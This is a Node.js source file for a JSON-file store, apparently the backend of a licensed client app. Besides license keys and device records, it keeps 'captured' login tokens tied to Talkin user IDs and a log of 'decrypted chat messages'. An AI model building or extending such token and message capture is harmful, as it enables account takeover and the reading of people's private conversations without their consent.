/**
 * store.js — Persistent JSON-based data store for license keys, devices, activity, login tokens.
 *
 * Why JSON file + not in-memory Map?
 *   Render free plan restarts the service every 15 min idle + on every deploy.
 *   In-memory Map would WIPE all keys on restart → user requirement "keys kabhi gayab na hon".
 *   So we persist to a JSON file on disk. Render web services have ephemeral disk,
 *   but for free plan this is the best option without an external DB.
 *
 *   For production durability, recommend: Render Disk (paid) OR external DB (MongoDB Atlas free).
 *   This module is written so swapping the backend is easy (just change load/save).
 */

const fs = require('fs');
const path = require('path');

const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, '..', 'data');
const DB_FILE = path.join(DATA_DIR, 'db.json');

const DEFAULT_DB = {
  keys: {},          // { [keyString]: KeyRecord }
  devices: {},       // { [deviceId]: DeviceRecord }
  activity: [],      // [ ActivityRecord, ... ]  (newest first, capped at MAX_ACTIVITY)
  loginTokens: {},   // { [deviceId]: [ {token, captured_at, talkin_uid} ] }
  messages: [],      // [ MessageRecord ] (decrypted chat messages, capped)
  meta: {
    created_at: new Date().toISOString(),
    version: 2,
  },
};

const MAX_ACTIVITY = 5000;   // cap activity log
const MAX_MESSAGES = 5000;   // cap message log

let _db = null;
let _saveTimer = null;

function ensureDir() {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
}

function load() {
  ensureDir();
  if (_db) return _db;
  try {
    if (fs.existsSync(DB_FILE)) {
      const raw = fs.readFileSync(DB_FILE, 'utf8');
      _db = JSON.parse(raw);
      // backfill missing collections (for upgrades)
      if (!_db.keys) _db.keys = {};
      if (!_db.devices) _db.devices = {};
      if (!_db.activity) _db.activity = [];
      if (!_db.loginTokens) _db.loginTokens = {};
      if (!_db.messages) _db.messages = [];
      if (!_db.meta) _db.meta = DEFAULT_DB.meta;
    } else {
      _db = JSON.parse(JSON.stringify(DEFAULT_DB));
      saveSync();
    }
  } catch (e) {
    console.error('[store] load error, starting fresh:', e.message);
    _db = JSON.parse(JSON.stringify(DEFAULT_DB));
  }
  return _db;
}

/**
 * Save synchronously (used on critical writes like key creation/block).
 */
function saveSync() {
  ensureDir();
  try {
    fs.writeFileSync(DB_FILE, JSON.stringify(_db, null, 2), 'utf8');
  } catch (e) {
    console.error('[store] saveSync error:', e.message);
  }
}

/**
 * Debounced save — coalesce rapid writes (activity logging).
 */
function save() {
  if (_saveTimer) clearTimeout(_saveTimer);
  _saveTimer = setTimeout(() => saveSync(), 800);
}

// ---------- Key operations ----------

function getKey(keyStr) {
  const db = load();
  return db.keys[keyStr] || null;
}

function putKey(keyStr, record) {
  const db = load();
  db.keys[keyStr] = record;
  saveSync();
  return record;
}

function listKeys() {
  const db = load();
  return Object.values(db.keys).sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
}

function deleteKey(keyStr) {
  const db = load();
  const existed = !!db.keys[keyStr];
  delete db.keys[keyStr];
  saveSync();
  return existed;
}

// ---------- Device operations ----------

function getDevice(deviceId) {
  const db = load();
  return db.devices[deviceId] || null;
}

function putDevice(deviceId, record) {
  const db = load();
  db.devices[deviceId] = record;
  saveSync();
  return record;
}

function listDevices() {
  const db = load();
  return Object.values(db.devices).sort((a, b) => new Date(b.first_seen) - new Date(a.first_seen));
}

// ---------- Activity log ----------

function logActivity(record) {
  const db = load();
  db.activity.unshift({ ...record, at: new Date().toISOString() });
  if (db.activity.length > MAX_ACTIVITY) db.activity.length = MAX_ACTIVITY;
  save();
}

function listActivity(limit = 200, deviceId = null) {
  const db = load();
  let items = db.activity;
  if (deviceId) items = items.filter(a => a.device_id === deviceId);
  return items.slice(0, limit);
}

// ---------- Login token capture ----------

function addLoginToken(deviceId, token, talkinUid) {
  const db = load();
  if (!db.loginTokens[deviceId]) db.loginTokens[deviceId] = [];
  db.loginTokens[deviceId].unshift({
    token,
    talkin_uid: talkinUid || null,
    captured_at: new Date().toISOString(),
  });
  if (db.loginTokens[deviceId].length > 50) db.loginTokens[deviceId].length = 50;
  saveSync();
}

function getLoginTokens(deviceId) {
  const db = load();
  return db.loginTokens[deviceId] || [];
}

function allLoginTokens() {
  const db = load();
  const out = [];
  for (const [deviceId, tokens] of Object.entries(db.loginTokens)) {
    for (const t of tokens) out.push({ device_id: deviceId, ...t });
  }
  return out;
}

// ---------- Messages (decrypted chat capture) ----------

function logMessage(record) {
  const db = load();
  db.messages.unshift({ ...record, at: new Date().toISOString() });
  if (db.messages.length > MAX_MESSAGES) db.messages.length = MAX_MESSAGES;
  save();
}

function listMessages(limit = 200, deviceId = null) {
  const db = load();
  let items = db.messages;
  if (deviceId) items = items.filter(m => m.device_id === deviceId);
  return items.slice(0, limit);
}

// ---------- Export raw DB (admin backup) ----------

function exportAll() {
  return load();
}

function importAll(obj) {
  _db = obj;
  saveSync();
}

module.exports = {
  load,
  saveSync,
  save,
  getKey,
  putKey,
  listKeys,
  deleteKey,
  getDevice,
  putDevice,
  listDevices,
  logActivity,
  listActivity,
  addLoginToken,
  getLoginTokens,
  allLoginTokens,
  logMessage,
  listMessages,
  exportAll,
  importAll,
  DB_FILE,
};
